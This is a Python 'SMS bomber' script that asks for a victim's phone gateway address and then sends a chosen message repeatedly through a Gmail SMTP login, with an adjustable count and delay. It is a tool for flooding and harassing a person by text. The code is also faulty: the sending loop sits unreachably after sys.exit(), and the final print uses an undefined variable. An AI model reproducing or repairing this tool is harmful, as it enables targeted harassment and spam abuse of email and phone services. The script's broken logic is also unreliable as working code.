## NotSlater's SMS Bomber ##
import sys
import time
import smtplib
#import tkinter.messagebox
from tkinter import messagebox
#import tkMessageBox as messagebox

print(" _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ ")
print("|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|")
print(" _     ____  __  __ ____     ____                                _ ")
print("| |   / ___||  \/  / ___|   |  _ \ ___  __ _ _ __   ___ _ __    | |")
print("| |   \___ \| |\/| \___ \   | |_) / _ \/ _` | '_ \ / _ \ '__|   | |")
print("| |    ___) | |  | |___) |  |  _ <  __/ (_| | |_) |  __/ |      | |")
print("| |   |____/|_|  |_|____/   |_| \_\___|\__,_| .__/ \___|_|      | |")
print("| |                                         |_|                 | |")
print("|_|                 Made By NotSlater#0999                      |_|")
print(" _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ ")
print("|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|")

#CONFIG. You can change any of the values on the right.
email_provider = 'smtp.gmail.com' #server for your email
email_address = "EXAMPLENAME@gmail.com" #insert your email here
email_port = 587 #port for email server
password = "EXAMPLEPASSWORD" #insert your email password here
print("-⬇-https://freecarrierlookup.com/-⬇-")
number = input("| Enter victims phone mail: ")
msg = input("| Message: ") #your txt message
text_amount = int(input("| How many texts: ")) #amount sent
msgdelay = float(input("| Message Delay: "))

startchoice = str(input("| Start? (y/n) "))
if startchoice.lower() == "n":
    messagebox.showinfo(title="Spammer Stopped", message="Mass SMS Spammer Stopped")
    sys.exit()



    ### DO NOT EDIT BELOW THIS LINE ###
    server = smtplib.SMTP(email_provider, email_port)
    server.starttls()
    #server.login(email_address, password)
    while text_amount > 0:
        if text_amount > 0:
            server.login(email_address, password)
            server.sendmail(email_address,number,msg)
            print("[+] Message Successfully Sent:" + msg)
            time.sleep(msgdelay)
            text_amount = text_amount - 1
            
    print("{} texts were sent successfully!".format(numb))
    server.quit()
